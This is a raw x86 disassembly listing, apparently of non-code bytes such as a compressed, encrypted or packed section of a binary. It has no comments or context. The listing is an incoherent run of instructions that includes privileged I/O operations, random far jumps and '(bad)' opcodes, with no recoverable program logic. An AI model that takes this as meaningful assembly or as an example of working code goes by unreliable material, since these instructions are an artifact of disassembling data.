  420f4d:	jno    0xcc989a5b
  420f53:	jle    0x420f3e
  420f55:	outs   dx,BYTE PTR ds:[esi]
  420f56:	jmp    0xbc20:0x11c46861
  420f5d:	push   cs
  420f5e:	wrmsr  
  420f60:	xchg   ebx,eax
  420f61:	loope  0x420fac
  420f63:	pop    ebx
  420f64:	push   0x7d
  420f66:	loop   0x420f3b
  420f68:	iret   
  420f69:	mov    DWORD PTR [esi+0x74],ebx
  420f6c:	xchg   esp,eax
  420f6d:	xlat   BYTE PTR ds:[ebx]
  420f6e:	jae    0x420f3d
  420f70:	xchg   edx,eax
  420f71:	out    dx,al
  420f72:	jo     0x420f9d
  420f74:	mov    dh,BYTE PTR [ebp-0x53f82b0d]
  420f7a:	jg     0x420f59
  420f7c:	cwde   
  420f7d:	and    al,0xd5
  420f7f:	test   al,0xb9
  420f81:	repz in eax,0xb3
  420f84:	jecxz  0x420f77
  420f86:	lahf   
  420f87:	push   ecx
  420f88:	xchg   ebx,eax
  420f89:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  420f8a:	(bad)  
  420f8b:	out    dx,eax
  420f8c:	popf   
  420f8d:	or     BYTE PTR [edi-0x430ad413],cl
  420f93:	sub    dl,BYTE PTR [ebx-0x5f1d8f78]
  420f99:	fs cmp eax,0xec3050a5
  420f9f:	call   0xf1b44596
  420fa4:	xchg   DWORD PTR [ebx+0x52],ecx
  420fa7:	and    eax,0x63623455
  420fac:	adc    al,bh
  420fae:	enter  0xa1ee,0xad
  420fb2:	loop   0x420ff7
  420fb4:	pop    ebx
  420fb5:	jle    0x421034
  420fb7:	xor    bl,BYTE PTR [edx+0x4cbab652]
  420fbd:	mov    al,ds:0x373cd8a0
  420fc2:	mov    BYTE PTR [esp+eiz*2+0x48e2f344],al
  420fc9:	retf   
  420fca:	retf   
  420fcb:	add    BYTE PTR [ebp+0x7f],dl
  420fce:	cmc    
  420fcf:	ins    DWORD PTR es:[edi],dx
  420fd0:	repnz pop ebp
  420fd2:	adc    eax,0xc76ff2f4
  420fd7:	fs pop es
  420fd9:	sahf   
  420fda:	xor    ah,bh
  420fdc:	xor    dl,BYTE PTR [esi+0x5a50b061]
  420fe2:	fild   WORD PTR [ebx+0x25]
  420fe5:	mov    bh,cl
  420fe7:	in     al,dx
  420fe8:	gs xor ch,bh
  420feb:	aam    0xe9
  420fed:	add    DWORD PTR [esi+edi*2-0x14],ebp
  420ff1:	fsubr  DWORD PTR [ebx]
  420ff3:	push   0x1f0d45b9
  420ff8:	daa    
  420ff9:	push   cs
  420ffa:	in     eax,0x62
  420ffc:	mov    esi,0x5074f64c
  421001:	pop    ss
  421002:	mov    dl,0x30
  421004:	aaa    
  421005:	jp     0x420fac
  421007:	dec    edi
  421008:	xor    BYTE PTR [eax+0x5307c45d],0x15
  42100f:	cmp    al,0x1
  421011:	cmp    DWORD PTR fs:[ebx+0x5f900905],eax
  421018:	add    dh,ah
  42101a:	loopne 0x420fb3
  42101c:	stos   BYTE PTR es:[edi],al
  42101d:	out    dx,al
  42101e:	cmp    ecx,ebx
  421020:	xchg   edx,eax
  421021:	lock imul edi,DWORD PTR ds:0x9e7bce09,0xffffff83
  421029:	shr    DWORD PTR [edi-0x5c],1
  42102c:	cwde   
  42102d:	ja     0x420fdf
  42102f:	push   edx
  421030:	outs   dx,BYTE PTR ds:[esi]
  421031:	jp     0x420fe4
  421033:	ret    
  421034:	xchg   ebp,ebp
  421036:	pop    ebp
  421037:	outs   dx,BYTE PTR ds:[esi]
  421038:	nop
  421039:	and    ecx,DWORD PTR [edi]
  42103b:	xchg   DWORD PTR [edi+0x6330db4e],edx
  421041:	aas    
  421042:	enter  0xa494,0x48
  421046:	bound  ebx,QWORD PTR [esi-0x35]
  421049:	mov    edi,0xc9c5d886
  42104e:	rcr    BYTE PTR [edi-0x388d1b60],1
  421054:	push   edx
  421055:	or     al,0x84
  421057:	jnp    0x421069
  421059:	cli    
  42105a:	test   al,0x39
  42105c:	sbb    al,0x9f
  42105e:	in     al,0xd8
  421060:	es jmp 0x9865b185
  421066:	cli    
  421067:	cwde   
  421068:	mov    ah,BYTE PTR [eax-0x59]
  42106b:	mov    al,ds:0xce4672b4
  421070:	and    al,BYTE PTR [ebp-0x39]
  421073:	pop    ss
  421074:	push   edi
  421075:	ret    
  421076:	pop    esp
  421077:	cwde   
  421078:	sbb    eax,DWORD PTR [ecx-0x20e8824d]
  42107e:	out    0xf,eax
  421080:	mov    BYTE PTR [eax+0x65],cl
  421083:	cmc    
  421084:	mov    eax,0x3c63f246
  421089:	adc    DWORD PTR [edx-0x60],esi
  42108c:	ror    DWORD PTR [ebx-0x61],0x32
  421090:	stc    
  421091:	paddq  mm2,mm6
  421094:	mov    DWORD PTR [edx+0x2a],0x4bd93704
  42109b:	or     edx,DWORD PTR [esi-0x79760e1a]
  4210a1:	lds    ecx,FWORD PTR [ecx+eax*2]
  4210a4:	fs loope 0x421114
  4210a7:	into   
  4210a8:	mov    ds:0x419f1d57,al
  4210ad:	mov    ch,0x13
  4210af:	cmp    BYTE PTR [ebp-0xc],cl
  4210b2:	(bad)  
  4210b3:	call   0xef7dfe66
  4210b8:	aam    0x88
  4210ba:	mov    eax,ds:0x696a8fbb
  4210bf:	shr    BYTE PTR ds:0x57826dd4,cl
  4210c5:	leave  
  4210c6:	sub    ch,BYTE PTR [edi+0x7890f13b]
  4210cc:	iret   
  4210cd:	pop    es
  4210ce:	shr    al,cl
  4210d0:	lahf   
  4210d1:	lods   eax,DWORD PTR ds:[esi]
  4210d2:	jne    0x421135
  4210d4:	retf   0xa306
  4210d7:	push   edx
  4210d8:	lods   al,BYTE PTR ds:[esi]
  4210d9:	mov    edi,0x7987c498
  4210de:	je     0x4210aa
  4210e0:	add    BYTE PTR [esi-0xc],al
  4210e3:	ss mov bh,0x1
  4210e6:	sbb    eax,0xa063bf26
  4210eb:	cmp    BYTE PTR [edx],bh
  4210ed:	and    dl,ch
  4210ef:	fs pop esp
  4210f1:	cld    
  4210f2:	sub    dh,ch
  4210f4:	adc    ebx,ecx
  4210f6:	scas   eax,DWORD PTR es:[edi]
  4210f7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4210f8:	add    DWORD PTR ds:0xc22273da,esp
  4210fe:	mov    bl,0x45
  421100:	pop    ds
  421101:	(bad)  
  421102:	sub    al,0x91
  421104:	ss call 0xc81f7aea
  42110a:	mov    ds:0x58aa1f40,al
  42110f:	popa   
  421110:	mov    eax,0xf7d2f662
  421115:	arpl   WORD PTR [eax-0x5c],cx
  421118:	push   esi
  421119:	fist   DWORD PTR [ebp+0x22dc2761]
  42111f:	sbb    DWORD PTR [ecx+0x3abbc083],esp
  421125:	cld    
  421126:	int3   
  421127:	retf   
  421128:	test   al,0x98
  42112a:	jmp    0x24ca:0x94a22752
  421131:	mov    edx,0xfa70b61a
  421136:	ins    BYTE PTR es:[edi],dx
  421137:	pop    ebp
  421138:	lahf   
  421139:	arpl   WORD PTR [edi-0x39],sp
  42113c:	or     BYTE PTR [edx+ebx*2+0x55],cl
  421140:	ret    0xdb10
  421143:	aas    
  421144:	push   ebp
  421145:	mov    ah,0x3a
  421147:	mov    DWORD PTR [eax],ecx
  421149:	stos   DWORD PTR es:[edi],eax
  42114a:	pop    ds
  42114b:	popa   
  42114c:	and    al,0x66
  42114e:	xchg   ecx,eax
  42114f:	dec    ecx
  421150:	out    0x4a,eax
  421152:	cmp    al,0x15
  421154:	xor    al,0xe
  421156:	fimul  DWORD PTR [ebx]
  421158:	in     al,0x8d
  42115a:	lahf   
  42115b:	xchg   edi,eax
  42115c:	outs   dx,BYTE PTR ds:[esi]
  42115d:	out    0xe3,al
  42115f:	into   
  421160:	cwde   
  421161:	shl    bh,cl
  421163:	jnp    0x42116b
  421165:	cmovns esi,DWORD PTR ds:0x968bdbf5
  42116c:	pop    edi
  42116d:	and    esp,DWORD PTR [esi+0x3a142017]
  421173:	cmc    
  421174:	fstp   QWORD PTR [ecx+0x73759ad]
  42117a:	sbb    dh,bl
  42117c:	pop    esp
  42117d:	int    0x37
  42117f:	push   edi
  421180:	and    edx,DWORD PTR [edx-0x1d]
  421183:	sub    al,0x89
  421185:	pop    ss
  421186:	mov    ds:0x8e5b54c4,eax
  42118b:	daa    
  42118c:	repnz int3 
  42118e:	les    esp,FWORD PTR [ecx]
  421190:	push   0x13a221fa
  421195:	ja     0x42114d
  421197:	fldcw  WORD PTR [edi+0x3a]
  42119a:	dec    edi
  42119b:	mov    eax,0x54e06096
  4211a0:	jo     0x421177
  4211a2:	(bad)  
  4211a3:	(bad)  
  4211a4:	mov    esi,0xeda5a087
  4211a9:	adc    BYTE PTR [ecx-0x11454a97],bh
  4211af:	cmp    eax,0x696fcffe
  4211b4:	sahf   
  4211b5:	dec    ecx
  4211b6:	adc    BYTE PTR [eax-0x5d],ch
  4211b9:	scas   al,BYTE PTR es:[edi]
  4211ba:	or     DWORD PTR [edx+0x4866342],esi
  4211c0:	repnz sbb al,0x6b
  4211c3:	scas   al,BYTE PTR es:[edi]
  4211c4:	js     0x421151
  4211c6:	ror    BYTE PTR [esi-0xe3a08c3],0xd3
  4211cd:	pop    eax
  4211ce:	pop    edx
  4211cf:	or     eax,0x89241d2c
  4211d4:	mov    eax,ebx
  4211d6:	add    dl,BYTE PTR [edx]
  4211d8:	fwait
  4211d9:	clc    
  4211da:	jo     0x421193
  4211dc:	mov    bh,0xb5
  4211de:	xlat   BYTE PTR ds:[ebx]
  4211df:	(bad)  es:[bx-0x741b]
  4211e5:	mov    ds:0x645dab2c,al
  4211ea:	adc    eax,0xffb5bd7f
  4211ef:	add    DWORD PTR [edx-0x35],edx
  4211f2:	call   0x26725ffa
  4211f7:	les    edi,FWORD PTR [edx]
  4211f9:	out    dx,al
  4211fa:	rcr    BYTE PTR [edx],cl
  4211fc:	test   DWORD PTR [ebx],ecx
  4211fe:	enter  0x9cfd,0xee
  421202:	test   eax,0x6ab676a3
  421207:	mov    ds:0xc2bd2889,al
  42120c:	inc    ebp
  42120d:	in     eax,dx
  42120e:	mov    bl,0x3f
  421210:	(bad)  
  421211:	hlt    
  421212:	gs or  dl,cl
  421215:	cdq    
  421216:	int3   
  421217:	dec    eax
  421218:	fmul   st,st(2)
  42121a:	xor    al,0xd0
  42121c:	cli    
  42121d:	ds fiadd DWORD PTR ds:[esp+eax*1+0x52]
  421223:	jp     0x4211be
  421225:	xor    BYTE PTR [ebx+edi*8+0x6d7b0197],dh
  42122c:	shl    esp,cl
  42122e:	mov    ds,WORD PTR [eax-0x3f7c18cd]
  421234:	push   eax
  421235:	inc    edi
  421236:	es loope 0x4211e1
  421239:	ror    DWORD PTR [eax+ecx*8],1
  42123c:	pushf  
  42123d:	out    0xb,eax
  42123f:	pop    ebx
  421240:	inc    eax
  421241:	push   eax
  421242:	lea    eax,[eax+edx*8]
  421245:	dec    di
  421247:	int3   
  421248:	mov    esp,0x711df109
  42124d:	push   ecx
  42124e:	add    ah,bh
  421250:	cmp    ebx,DWORD PTR [ebp+0x1a]
  421253:	cli    
  421254:	sbb    ah,dh
  421256:	lods   eax,DWORD PTR ds:[esi]
  421257:	mov    ch,0x52
  421259:	or     eax,0x3d599eaa
  42125e:	or     DWORD PTR cs:[ecx],0x41
  421262:	add    BYTE PTR [edi+0x909b69d],bl
  421268:	add    eax,0x9b731f4d
  42126d:	inc    esi
  42126e:	ds pop ecx
  421270:	dec    ebp
  421271:	(bad)  
  421272:	adc    BYTE PTR [eax],dh
  421274:	addr16 push 0x560a1c41
  42127a:	sbb    ecx,DWORD PTR [ecx]
  42127c:	ins    BYTE PTR es:[edi],dx
  42127d:	leave  
  42127e:	bound  esi,QWORD PTR [eax+0x277f629a]
  421284:	sub    bh,BYTE PTR [eax]
  421286:	outs   dx,DWORD PTR ds:[esi]
  421287:	stc    
  421288:	fild   WORD PTR [ebp-0x28]
  42128b:	adc    al,BYTE PTR [edi]
  42128d:	ficom  WORD PTR [ecx]
  42128f:	lods   al,BYTE PTR cs:[esi]
  421291:	scas   eax,DWORD PTR es:[edi]
  421292:	pop    eax
  421293:	cli    
  421294:	add    eax,0x9057aa07
  421299:	jmp    0x36d36c66
  42129e:	das    
  42129f:	mul    BYTE PTR [ebx-0xd]
  4212a2:	push   eax
  4212a3:	bound  ecx,QWORD PTR ds:0x7768de5b
  4212a9:	out    0x54,eax
  4212ab:	add    ah,cl
  4212ad:	xchg   esi,eax
  4212ae:	xchg   ebx,eax
  4212af:	js     0x4212f9
  4212b1:	xchg   DWORD PTR [edi+0x29],edx
  4212b4:	push   ebp
  4212b5:	loope  0x421238
  4212b7:	add    al,0x6f
  4212b9:	push   es
  4212ba:	jnp    0x4212ab
  4212bc:	(bad)  
  4212bd:	adc    DWORD PTR [edx-0x11],ecx
  4212c0:	mov    ebp,DWORD PTR ds:0x30f67c12
  4212c6:	fwait
  4212c7:	outs   dx,BYTE PTR ds:[esi]
  4212c8:	xlat   BYTE PTR ds:[ebx]
  4212c9:	aas    
  4212ca:	(bad)  
  4212cb:	sbb    al,0xac
  4212cd:	mov    edx,0xb7d87b20
  4212d2:	adc    DWORD PTR [eax-0x5d],esp
  4212d5:	add    eax,0x10278613
  4212da:	mov    edx,0xb59798
  4212df:	(bad)  
  4212e0:	xor    eax,0xcbf54998
  4212e5:	push   ecx
  4212e6:	mov    ecx,0x78ef9a98
  4212ec:	ss mov ah,0x6e
  4212ef:	dec    eax
  4212f0:	pop    ds
  4212f1:	mov    al,ds:0x32bc9160
  4212f6:	or     ch,BYTE PTR [ecx-0x70ec8285]
  4212fc:	jns    0x4212e5
  4212fe:	cwde   
  4212ff:	push   ebp
  421300:	mov    edx,0x1a98f447
  421305:	sbb    ebx,eax
  421307:	aas    
  421308:	sbb    eax,0x56d823be
  42130d:	loope  0x421294
  42130f:	mov    dh,0x3e
  421311:	dec    ebp
  421312:	loop   0x421387
  421314:	push   ecx
  421315:	retf   0x7a22
  421318:	in     al,dx
  421319:	fistp  QWORD PTR [ebx+0x5d9b7b3a]
  42131f:	ror    DWORD PTR [esi],cl
  421321:	add    esi,DWORD PTR [ebx+0x4a4efddb]
  421327:	ror    BYTE PTR [edi+0x3b9371e6],cl
  42132d:	sub    DWORD PTR [esi+0x432868ba],0x61
  421334:	enter  0x7522,0x1
  421338:	mov    eax,0xbe435024
  42133d:	loopne 0x4213be
  42133f:	sub    eax,0xbdea331e
  421344:	push   es
  421345:	fdivr  DWORD PTR [eax]
  421347:	call   0x4d182c42
  42134c:	into   
  42134d:	pop    ds
  42134e:	mov    bh,0xcd
  421350:	mov    esi,DWORD PTR [edx-0x584d66f0]
  421356:	adc    al,0x78
  421358:	add    al,0x3f
  42135a:	leave  
  42135b:	jle    0x421374
  42135d:	mov    dh,0x12
  42135f:	(bad)  
  421360:	pusha  
  421361:	ds into 
  421363:	push   0x902b7ab3
  421368:	dec    eax
  421369:	ja     0x421300
  42136b:	(bad)  [eax-0x45e29a12]
  421371:	add    BYTE PTR [esi-0x1d370aad],cl
  421377:	test   al,0xf7
  421379:	aad    0xc5
  42137b:	cdq    
  42137c:	dec    BYTE PTR [edi+0xf4a37ee]
  421382:	push   ebp
  421383:	push   edi
  421384:	inc    eax
  421385:	inc    edi
  421386:	stc    
  421387:	add    edx,DWORD PTR [eax-0x2a]
  42138a:	ds out 0xc8,eax
  42138d:	pop    eax
  42138e:	repnz xchg eax,ebx
  421391:	pop    esp
  421392:	(bad)  
  421393:	mov    dh,0x3b
  421395:	cdq    
  421396:	jle    0x421321
  421398:	pushf  
  421399:	mov    esi,0x9548ad76
  42139e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42139f:	mov    WORD PTR [ebp+0x46111bfc],?
  4213a5:	mov    ebx,0x1e0e7a7f
  4213aa:	jnp    0x42135e
  4213ac:	test   al,0x1
  4213ae:	mov    edi,0x6754f108
  4213b3:	ins    BYTE PTR es:[edi],dx
  4213b4:	sbb    DWORD PTR [ecx+0x14],edx
  4213b7:	and    eax,0x5c6b8a11
  4213bc:	xor    ecx,ecx
  4213be:	jg     0x42137c
  4213c0:	pop    es
  4213c1:	or     dh,BYTE PTR [eax+0xe]
  4213c4:	icebp  
  4213c5:	mov    al,ds:0xc0bc6627
  4213ca:	in     eax,0xbb
  4213cc:	mov    al,BYTE PTR [edi+esi*4-0xa]
  4213d0:	data16 mov ch,0x56
  4213d3:	dec    edi
  4213d4:	pop    ecx
  4213d5:	sbb    esp,DWORD PTR ds:0xf2318bf2
  4213db:	stc    
  4213dc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4213dd:	shl    DWORD PTR [edi-0x657f78bf],0x96
  4213e4:	adc    esp,DWORD PTR [edi-0x62]
  4213e7:	jl     0x421424
  4213e9:	leave  
  4213ea:	ror    BYTE PTR [eax+0x77219772],0xca
  4213f1:	out    dx,al
  4213f2:	sti    
  4213f3:	jbe    0x42139b
  4213f5:	adc    eax,0x3c758da3
  4213fa:	jg     0x4213fc
  4213fc:	in     eax,0x52
  4213fe:	mov    edx,0x7cde4f8d
  421403:	jecxz  0x421481
  421405:	jae    0x4213f4
  421407:	xor    cl,BYTE PTR [esi]
  421409:	scas   al,BYTE PTR es:[edi]
  42140a:	out    dx,eax
  42140b:	dec    edx
  42140c:	jbe    0x4213d8
  42140e:	daa    
  42140f:	aam    0x5b
  421411:	jl     0x421412
  421413:	inc    ebx
  421414:	add    al,0x8e
  421416:	dec    esi
  421417:	pop    edx
  421418:	leave  
  421419:	push   0xffffffb4
  42141b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42141c:	sar    ch,cl
  42141e:	ins    DWORD PTR es:[edi],dx
  42141f:	mov    bl,0x3b
  421421:	xchg   edx,eax
  421422:	mov    cl,0x1a
  421424:	fdivr  st,st(3)
  421426:	aaa    
  421427:	cmc    
  421428:	std    
  421429:	loopne 0x4213b6
  42142b:	stos   BYTE PTR es:[edi],al
  42142c:	add    ah,BYTE PTR [edx-0x71f1ac2e]
  421432:	out    dx,eax
  421433:	xor    al,0x64
  421435:	mov    ds:0x1b763a51,eax
  42143a:	xor    edx,DWORD PTR [ebx+ebx*4+0x35]
  42143e:	and    eax,0xa516484
  421443:	dec    ebx
  421444:	ins    BYTE PTR es:[edi],dx
  421445:	test   eax,0xdba0b76f
  42144a:	in     al,dx
  42144b:	leave  
  42144c:	mov    WORD PTR [ebx+esi*2-0x31ff9044],gs
  421453:	mov    DWORD PTR [ebp+0x41],ecx
  421456:	imul   edx,ebx,0xfffffff6
  421459:	shl    dl,0x74
  42145c:	imul   eax,DWORD PTR [ebx-0x4d91d49f],0x3a
  421463:	mov    BYTE PTR [eax],cl
  421465:	bound  eax,QWORD PTR [esp+ebx*1+0x6f612317]
  42146c:	std    
  42146d:	or     eax,0xb6f08022
  421472:	sbb    cl,cl
  421474:	mov    dl,0x89
  421476:	out    0x59,al
  421478:	jae    0x421467
  42147a:	jns    0x4214e3
  42147c:	xor    eax,0x89ba826d
  421481:	addr16 jmp 0x421473
  421484:	sub    ebp,DWORD PTR [ecx-0x142c76a5]
  42148a:	scas   eax,DWORD PTR es:[edi]
  42148b:	xchg   BYTE PTR [ecx],ah
  42148d:	xchg   edi,eax
  42148e:	add    DWORD PTR [edx-0x29c474a],edi
  421494:	ins    BYTE PTR es:[edi],dx
  421495:	lahf   
  421496:	sub    ebp,0x680dd7d0
  42149c:	int3   
  42149d:	sbb    eax,0x4801f142
  4214a2:	in     al,0x2d
  4214a4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4214a5:	cld    
  4214a6:	shl    DWORD PTR [ecx],0x4
  4214a9:	push   ds
  4214aa:	xchg   ebp,eax
  4214ab:	and    al,0x83
  4214ad:	mov    al,ds:0x3f91c125
  4214b2:	mov    ah,0x9
  4214b4:	add    bl,cl
  4214b6:	mov    eax,0x7f2fb160
  4214bb:	jns    0x421533
  4214bd:	(bad)  
  4214bf:	(bad)  
  4214c0:	out    0x67,eax
  4214c2:	sbb    al,0x78
  4214c4:	sar    DWORD PTR [esi],0x6a
  4214c7:	jecxz  0x421545
  4214c9:	outs   dx,BYTE PTR ds:[esi]
  4214ca:	pop    ss
  4214cb:	(bad)  [edx]
  4214cd:	push   edx
  4214ce:	push   eax
  4214cf:	and    eax,0x812188f4
  4214d4:	cld    
  4214d5:	jne    0x4214ac
  4214d7:	sti    
  4214d8:	inc    eax
  4214d9:	es stc 
  4214db:	in     eax,0xa0
  4214dd:	(bad)  
  4214de:	xchg   ebx,eax
  4214df:	arpl   WORD PTR [esi-0xc50d9f1],di
  4214e5:	imul   ecx,DWORD PTR [esi],0xffffff88
  4214e8:	ror    bh,1
  4214ea:	not    ecx
  4214ec:	xchg   BYTE PTR [esi],dh
  4214ee:	pop    edx
  4214ef:	xchg   bl,cl
  4214f1:	sbb    esi,DWORD PTR [edx-0x38801d70]
  4214f7:	mov    edi,0x5fb1f1ae
  4214fc:	or     eax,0x2b390b66
  421501:	sub    ch,ah
  421503:	not    BYTE PTR [edx-0x1dc9092]
  421509:	xor    ah,BYTE PTR [ebx-0x4e4d6393]
  42150f:	pop    ds
  421510:	scas   eax,DWORD PTR es:[edi]
  421511:	jne    0x4214dc
  421513:	ret    
  421514:	pushf  
  421515:	xchg   ebp,eax
  421516:	lahf   
  421517:	out    0x2e,al
  421519:	and    al,dl
  42151b:	imul   esp,DWORD PTR [edi+0x4456fcd1],0x76
  421522:	push   eax
  421523:	push   ds
  421524:	jbe    0x42152d
  421526:	pop    esp
  421527:	xor    bh,dl
  421529:	enter  0xb512,0x85
  42152d:	repnz push ecx
  42152f:	jg     0x4215ac
  421531:	xlat   BYTE PTR ds:[ebx]
  421532:	xlat   BYTE PTR ds:[ebx]
  421533:	mov    ebx,?
  421535:	push   esi
  421536:	xor    ebx,DWORD PTR [eax+esi*8-0x5db29151]
  42153d:	xchg   DWORD PTR [eax+0x61],edx
  421540:	lods   al,BYTE PTR ds:[esi]
  421541:	aas    
  421542:	shr    DWORD PTR [edi+ebx*1],1
  421545:	cmp    al,0x31
  421547:	loopne 0x4215b7
  421549:	outs   dx,BYTE PTR ds:[esi]
  42154a:	mov    al,ds:0x9e89c02f
  42154f:	int3   
  421550:	mov    eax,ds:0xf411a8bd
  421555:	out    0xe7,al
  421557:	pop    esi
  421558:	mov    ebx,0x964ad62d
  42155d:	fbstp  TBYTE PTR [ecx+0x46fe0d7f]
  421563:	leave  
  421564:	(bad)  
  421565:	sti    
  421566:	(bad)  
  421567:	xchg   ecx,eax
  421568:	add    BYTE PTR [eax],al
  42156a:	push   edi
  42156b:	pop    edx
  42156c:	dec    edx
  42156d:	inc    esi
  42156e:	dec    edi
  42156f:	push   esi
  421570:	pop    edi
  421571:	pop    ebx
  421572:	push   esp
  421573:	inc    eax
  421574:	cmp    eax,0xdb90fbb5
  421579:	ret    0xa474
  42157c:	add    DWORD PTR [eax],eax
  42157e:	xchg   BYTE PTR [esi],al
  421580:	add    BYTE PTR [eax],al
  421582:	lock xchg edi,eax
  421584:	push   DWORD PTR [ecx+eiz*1+0x30]
  421588:	pop    esp
  421589:	inc    edx
  42158a:	push   edx
  42158b:	mov    dl,0x30
  42158d:	or     BYTE PTR [ebx],0xd4
  421590:	ja     0x421525
  421592:	mov    ds:0x20808c57,al
  421597:	ss sub al,0x9c
  42159a:	adc    eax,0x620673b1
  42159f:	cmp    DWORD PTR [edi-0x2a080113],0xf0bde9df
  4215a9:	out    0x4d,al
  4215ab:	dec    edi
  4215ac:	arpl   WORD PTR [ebp+0xe],di
  4215af:	and    al,al
  4215b1:	sub    DWORD PTR [ecx-0x511ff30],0x32
  4215b8:	imul   ecx,DWORD PTR [edi],0xdea16dd7
  4215be:	push   ss
  4215bf:	(bad)  
  4215c0:	aam    0x12
  4215c2:	mov    ecx,ds
  4215c4:	and    edi,DWORD PTR [esi-0x74f4d0f6]
  4215ca:	cld    
  4215cb:	push   ebx
  4215cc:	and    BYTE PTR [ebp-0x294a58d1],ch
  4215d2:	sbb    esi,DWORD PTR [eax+0x2d0c1de1]
  4215d8:	inc    ebx
  4215d9:	inc    ebp
  4215da:	sbb    esp,DWORD PTR [ebp+0x33]
  4215dd:	test   dl,al
  4215df:	jnp    0x421627
  4215e1:	retf   
  4215e2:	push   ss
  4215e3:	call   0xbf49cb11
  4215e8:	lds    edi,FWORD PTR ds:0x320968c6
  4215ee:	sub    ebx,DWORD PTR [esi-0x51d53b18]
  4215f4:	or     bh,BYTE PTR ds:0x8412adab
  4215fa:	outs   dx,DWORD PTR ds:[esi]
  4215fb:	les    eax,FWORD PTR [ecx]
  4215fd:	lods   al,BYTE PTR ds:[esi]
  4215fe:	xor    DWORD PTR [edi+0xdc5a61e],edx
  421604:	and    al,0x45
  421606:	inc    edi
  421607:	mov    BYTE PTR [eax+0x1909e4a3],bl
  42160d:	mov    edx,0xfbb81a63
  421612:	mov    ebp,0xfadbed0c
  421617:	mov    al,ds:0x97515516
  42161c:	lea    eax,[esi-0x42c6196c]
  421622:	(bad)  
  421623:	push   ds
  421624:	xor    BYTE PTR [edx],cl
  421626:	xor    eax,0x89a024e0
  42162b:	idiv   bh
  42162d:	enter  0xe7a0,0xee
  421631:	not    BYTE PTR [esi+ebp*8+0x2d]
  421635:	push   edx
  421636:	mov    cl,0x12
  421638:	int    0xe3
  42163a:	mov    ds:0x61059c63,al
  42163f:	cwde   
  421640:	fld    DWORD PTR [ecx+0x76d1ec82]
  421646:	xchg   ecx,eax
  421647:	push   edi
  421648:	out    0x43,al
  42164a:	sbb    ch,BYTE PTR [edi]
  42164c:	mov    eax,es:0x122b6f90
  421652:	das    
  421653:	in     al,0xb0
  421655:	cmp    DWORD PTR [ebp+0x77544c71],ebx
  42165b:	xor    DWORD PTR [edi+0x14],0x1
  42165f:	mov    ds:0x254756b3,eax
  421664:	xchg   ah,al
  421666:	sub    BYTE PTR [ebx+0x19],ah
  421669:	sbb    BYTE PTR [ebx+0x5c586906],cl
  42166f:	add    ebp,0xcdab45fa
  421675:	rol    ah,1
  421677:	and    eax,0xab091fc
  42167c:	inc    ecx
  42167d:	sub    ebp,DWORD PTR [edx]
  42167f:	arpl   WORD PTR [eax+0x46849116],bx
  421685:	repz bound edx,QWORD PTR [esi+0x7195d419]
  42168c:	mov    cs,WORD PTR [ebx+0x4f]
  42168f:	(bad)
  421692:	jbe    0x421695
  421694:	push   ebp
  421695:	mov    esp,DWORD PTR [ecx]
  421697:	mov    DWORD PTR [eax-0x78],ebx
  42169a:	push   edi
  42169b:	mov    esp,edx
  42169d:	dec    esp
  42169e:	mov    eax,ds:0x933f0f0
  4216a3:	add    BYTE PTR [edi],dl
  4216a5:	or     edx,DWORD PTR [eax-0x3fee31fa]
  4216ab:	mov    ch,BYTE PTR [esp+eiz*8-0x48]
  4216af:	fiadd  WORD PTR [esi+0x3c]
  4216b2:	sahf   
  4216b3:	xchg   ebx,eax
  4216b4:	cmp    BYTE PTR [ecx-0x3],0x70
  4216b8:	add    BYTE PTR [ebx+0x26c25c5a],ch
  4216be:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4216bf:	fadd   DWORD PTR [eax+ebx*1-0x6f]
  4216c3:	into   
  4216c4:	out    dx,al
  4216c5:	push   edx
  4216c6:	or     BYTE PTR [ecx+edx*1-0x20a15bd4],dl
  4216cd:	aad    0x16
  4216cf:	and    BYTE PTR fs:[ebp+ebp*1-0x10],0x4d
  4216d5:	xchg   esi,eax
  4216d6:	into   
  4216d7:	sub    al,0x63
  4216d9:	es loop 0x42166f
  4216dc:	and    BYTE PTR es:[edi-0x6],ch
  4216e0:	das    
  4216e1:	repnz aaa 
  4216e3:	neg    ah
  4216e5:	mov    al,0xed
  4216e7:	or     DWORD PTR [eax+0x6e],ecx
  4216ea:	iret   
  4216eb:	jle    0x421731
  4216ed:	sbb    BYTE PTR [edi-0x6d221a21],bh
  4216f3:	or     eax,0x586327d5
  4216f8:	in     al,dx
  4216f9:	or     esi,DWORD PTR [ebx]
  4216fb:	pop    edx
  4216fc:	rcl    BYTE PTR [ecx+ecx*2+0x65],cl
  421700:	ss dec ebx
  421702:	loop   0x421765
  421704:	pop    edx
  421705:	mov    al,ds:0xf0ed95a1
  42170a:	pop    ebp
  42170b:	outs   dx,BYTE PTR ds:[esi]
  42170c:	not    DWORD PTR [ebx]
  42170e:	push   esp
  42170f:	push   esi
  421710:	and    BYTE PTR [eax],al
  421712:	fisubr DWORD PTR [ebp-0x289fa4a9]
  421718:	and    eax,0x84655f92
  42171d:	push   cs
  42171e:	addr16 jg 0x42177c
  421721:	mov    ch,0x9e
  421723:	push   esi
  421724:	xchg   edi,eax
  421725:	adc    al,0xf7
  421727:	inc    eax
  421728:	jecxz  0x42177e
  42172a:	xor    al,0x24
  42172c:	hlt    
  42172d:	jmp    0x7b8b:0xf6b8a3f9
  421734:	inc    edx
  421735:	jecxz  0x42171e
  421737:	clc    
  421738:	std    
  421739:	xor    cl,BYTE PTR [edx-0x1b]
  42173c:	pop    edx
  42173d:	xlat   BYTE PTR ds:[ebx]
  42173e:	in     eax,dx
  42173f:	test   eax,0xcea4d59a
  421744:	mov    dh,BYTE PTR [edi-0x32]
  421747:	call   DWORD PTR [ebp+0x48]
  42174a:	aas    
  42174b:	and    BYTE PTR [ebx-0x5dd3eb6f],al
  421751:	xchg   esi,eax
  421752:	loope  0x421763
  421754:	gs push eax
  421756:	aad    0x81
  421758:	mov    ds:0xa6777f71,al
  42175d:	and    eax,0x7cb0ed24
  421762:	test   eax,0xafbbd8bb
  421767:	xchg   ecx,eax
  421768:	jns    0x42175f
  42176a:	fucomip st,st(6)
  42176c:	pushf  
  42176d:	stos   DWORD PTR es:[edi],eax
  42176e:	jl     0x421774
